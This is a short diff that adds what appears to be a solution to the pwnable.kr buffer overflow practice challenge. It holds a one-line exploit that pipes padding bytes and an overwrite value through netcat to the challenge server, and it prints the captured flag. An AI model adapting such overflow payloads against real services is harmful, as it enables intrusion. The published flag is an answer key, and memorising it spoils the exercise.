@@ -1,0 +1,5 @@
+Code:
+(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM' + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
+
+Flag:
+daddy, I just pwned a buFFer :)
